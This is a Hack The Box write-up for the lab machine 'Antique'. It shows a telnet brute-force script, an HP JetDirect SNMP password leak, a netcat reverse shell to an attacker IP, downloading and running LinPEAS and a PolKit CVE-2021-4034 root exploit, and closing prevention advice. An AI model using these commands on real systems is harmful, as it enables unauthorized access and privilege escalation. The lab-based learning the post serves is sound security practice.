---
layout: post
title: Hack The Box Walkthrough - Antique
date: 2022-04-17
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
permalink: /2022/04/HTB/Antique
img: 2022/04/Antique/Antique.png
---

This is a very simple machine to own. It uses unpatched software with known vulnerability issues.

* Room: Antique
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/Antique](https://app.hackthebox.com/machines/Antique)
* Author: [MrR3boot](https://app.hackthebox.com/users/13531)

## Enumeration

I started the box by adding the IP to my host file, then enumerating opened ports with RustScan.

```bash
$ cat /etc/hosts
...
10.129.130.116            target target.htb

$ rustscan -a target -- -A | tee rust.txt

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.130.116:23
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
```

Only port 23 (telnet) is opened. I tried connecting to it.

```bash
$ telnet target
Trying 10.129.130.116...
Connected to target.
Escape character is '^]'.

HP JetDirect

Password: admin
Invalid password
Connection closed by foreign host.
```

It looked like the console for a printer. I tried a few simple passwords (admin, root, ...) but none of them worked. I looked online for the default password for HP JetDirect and did not find anything.

I wrote a small script to try to brute force the password.

```python
from pwn import *
import sys


def try_password(password):
    if len(password) < 1:
        return

    print(f'Trying password {password}')
    conn = remote('target.htb', 23)
    conn.recvuntil(b"HP JetDirect")
    conn.recv()
    conn.send(b"\n")

    conn.recvuntil(b"Password: ")
    conn.send(bytes(password, 'utf-8'))
    response = str(conn.recv())

    conn.close()

    if 'Invalid' not in response:
        print(response)
        print(password)
        exit()

if len(sys.argv) != 2:
    print('Usage python brute.py PASSWORD_FILE')
    exit()


file_name = sys.argv[1]
file = open(file_name, "r")

for line in file:
    line = line.strip()
    try_password(line)
```

I launched the sript with the rockyout.txt password list.

While it was running, I looked for know vulnerabilities in HP JetDirect. I found a [post](http://www.irongeek.com/i.php?page=security/networkprinterhacking) that explained how to get the password using a SNMP vulnerability. I tried it on the target.

```bash
$ snmpget -v 1 -c public target.htb .1.3.6.1.4.1.11.2.3.9.1.1.13.0
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```

I used [CyberChef's From Hex recipe](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')) to decode the hexadecimal values listed and it gave me a password.


```bash
$ telnet target.htb
Trying 10.129.130.116...
Connected to target.
Escape character is '^]'.

HP JetDirect

Password: REDACTED

Please type "?" for HELP
```

The password worked. I stoped my script from trying to brute force the password. It would have never found it as the password is not in rockyou. 

I looked at the commands I could run. There was an `exec` command that allowed me to run arbitrary commands on the server. I used it to get the first flag.

```bash
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session

> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)

> exec ls -la
total 16
drwxr-xr-x 2 lp   lp   4096 Sep 27  2021 .
drwxr-xr-x 6 root root 4096 May 14  2021 ..
lrwxrwxrwx 1 lp   lp      9 May 14  2021 .bash_history -> /dev/null
-rwxr-xr-x 1 lp   lp   1959 Sep 27  2021 telnet.py
-rw------- 2 lp   lp     33 Apr 17 12:54 user.txt

> exec cat user.txt
REDACTED
```

## Privilege Escalation

The next step was to get root on the box. But first I needed a shell on the machine. I stated a netcat listener on my machine and used the `exec` command to opend a reverse shell.

```bash
exec mkfifo /tmp/kirxhbg; nc 10.10.14.50 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg
```

```bash
$ nc -klvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.130.116 45366
whoami
lp
```

From there I looked around the machine for some time. I could not find anything to exploit. So I tried using [LinPEAS](https://github.com/carlospolop/PEASS-ng). I copied it to a folder on my machine and started a web server.

```bash
$ sudo python -m http.server 80
```

Then I downloaded it on the server and ran it. 

```bash
lp@antique:/tmp$ curl 10.10.14.50/linpeas.sh -o linpeas.sh

lp@antique:/tmp$ sh linpeas.sh | tee res.txt
```
![LinPEAS](/assets/images/2022/04/Antique/LinPEAS.png "LinPEAS")

The first thing LinPEAS found was that the machine was vulnerable to the [PolKit](https://nvd.nist.gov/vuln/detail/cve-2021-4034) exploit. This vulnerability allow using pkexec to run arbitrary code as root.

```bash
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.31

Vulnerable to CVE-2021-4034
```

I found a [Python script](https://github.com/joeammond/CVE-2021-4034) that uses this vulnerability to get a shell as root. I downloaded the script and ran it.

```bash
lp@antique:/tmp$ curl 10.10.14.50/exploit.py -o exploit.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3262  100  3262    0     0  50968      0 --:--:-- --:--:-- --:--:-- 50968

lp@antique:/tmp$ python3 exploit.py
[+] Creating shared library for exploit code.
[+] Calling execve()

# whoami
root

# cat /root/root.txt
REDACTED
```

## Prevention

Fixing this machine to prevent exploitation should be fairly simple. First, the port for the printer management software should probably not be exposed. This application allow running any command on the server. If it's really needed, access to it should be restricted. 

But more important, the machine should be updated. Both vulnerabilities have alvailable fixes. The PolKit vulnerability is a big one, and keeping a vulnerable version is looking for trouble. Any machine that still uses a vulnerable version should be patched quickly.